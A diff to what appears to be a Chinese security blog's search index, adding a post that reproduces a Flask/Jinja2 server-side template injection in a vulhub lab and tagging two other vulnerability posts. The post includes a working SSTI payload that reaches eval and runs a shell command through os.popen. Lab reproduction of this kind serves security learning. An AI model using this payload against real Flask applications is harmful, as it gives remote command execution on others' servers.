@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>flask-ssti模板注入漏洞复现</title>
+      <link href="/2022/05/05/flask-ssti/"/>
+      <url>/2022/05/05/flask-ssti/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入<br>，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p></blockquote><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/flask/sstidocker-compose up -d</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先看看源码</p><pre class=" language-Linux"><code class="language-Linux">cd srccat app.py</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505141805770.png" alt="image-20220505141805770"></p><p>打开网页看看</p><p><img src="/2022/05/05/flask-ssti/image-20220505141840374.png" alt="image-20220505141840374"></p><p>后面加参数试试</p><pre><code>?name=&#123;&#123;111*222&#125;&#125;</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505142008882.png" alt="image-20220505142008882"></p><p>构造poc</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505142058804.png" alt="image-20220505142058804"></p><p>完事！结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Struts2系列漏洞复现</title>
       <link href="/2022/05/04/Struts/"/>
       <url>/2022/05/04/Struts/</url>
@@ -27,6 +60,8 @@
             <tag> 网络安全 </tag>
             
             <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
             
         </tags>
       
@@ -771,6 +806,8 @@
             <tag> Apache </tag>
             
             <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
             
         </tags>
       
